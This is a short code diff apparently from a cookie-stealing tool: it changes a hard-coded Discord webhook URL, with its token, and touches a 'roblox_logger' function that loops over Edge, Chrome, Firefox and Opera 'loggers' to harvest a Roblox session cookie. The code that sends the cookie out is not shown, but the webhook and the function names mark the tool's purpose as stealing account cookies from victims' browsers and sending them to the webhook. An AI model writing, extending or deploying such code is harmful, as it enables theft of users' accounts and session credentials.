@@ -1,10 +1,10 @@
 from loggers import *
 from ThreadWithReturnValue import *
 
-WEBHOOK = 'https://discord.com/api/webhooks/984019081575424000/wxQyVwe_5i86SRNbGM0oaGnAiZKvB-MTP8OXBjD8krdp26Gh10sve7cX9GKs6xp08VwZ'
+WEBHOOK = 'https://discord.com/api/webhooks/988805891161747517/NasYsAMhHj-t-coFhiLrj7RTodovn6UOzGUGRGw9HKAKQjlIgx-Gpiqlw0JaqopBxZlk'
 
 
-def roblox_logger():
+def roblox_logger(event=None):
     finded_cookie = ""
 
     browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
